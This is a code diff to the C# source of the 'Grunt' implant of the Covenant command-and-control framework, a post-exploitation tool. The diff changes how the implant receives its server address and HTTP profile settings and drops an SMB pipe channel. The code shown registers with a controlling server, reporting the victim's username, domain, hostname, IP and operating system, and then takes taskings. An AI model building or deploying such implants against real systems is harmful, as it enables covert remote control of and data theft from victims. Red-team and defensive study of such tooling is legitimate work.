@@ -16,21 +16,17 @@ namespace GruntExecutor
 {
     class Grunt
     {
-        public static void Execute(string GUID, Aes SessionKey, NamedPipeServerStream ServerPipe = null, string PipeName = null)
+        public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
         {
             try
             {
-                string CovenantURI = @"{{REPLACE_COVENANT_URI}}";
-                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                 int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                 int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                 DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-				List<string> ProfileHttpHeaderNames = new List<string>();
-                List<string> ProfileHttpHeaderValues = new List<string>();
-                // {{REPLACE_PROFILE_HTTP_HEADERS}}
-				List<string> ProfileHttpUrls = new List<string>();
-                // {{REPLACE_PROFILE_HTTP_URLS}}
+				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
 				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
 				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
 				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
@@ -67,15 +63,8 @@ namespace GruntExecutor
 
                 string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                 IMessenger baseMessenger = null;
-                if (ServerPipe != null)
-                {
-                    baseMessenger = new SMBMessenger(ServerPipe, PipeName);
-                }
-                else
-                {
-                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
-                    baseMessenger.Read();
-                }
+                baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
+                baseMessenger.Read();
                 baseMessenger.Identifier = GUID;
                 TaskingMessenger messenger = new TaskingMessenger
                 (
@@ -310,12 +299,8 @@ namespace GruntExecutor
     public class TaskingMessenger
     {
         private object _UpstreamLock = new object();
-        private IMessenger _UpstreamMessenger;
-        private IMessenger UpstreamMessenger
-        {
-            get { return this._UpstreamMessenger; }
-            set { this._UpstreamMessenger = value; }
-        }
+        
+        private IMessenger UpstreamMessenger { get; set; }
         private MessageCrafter Crafter { get; }
         private Profile Profile { get; }
 
@@ -575,7 +560,6 @@ namespace GruntExecutor
         private List<string> ProfileHttpHeaderNames { get; }
         private List<string> ProfileHttpHeaderValues { get; }
         private List<string> ProfileHttpUrls { get; }
-        private List<string> ProfileHttpCookies { get; }
 
         private bool UseCertPinning { get; set; }
         private bool ValidateCert { get; set; }
@@ -1009,6 +993,6 @@ namespace GruntExecutor
             return sb.ToString();
         }
 
-        // {{REPLACE_PROFILE_HTTP_TRANSFORM}}
+        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
     }
 }
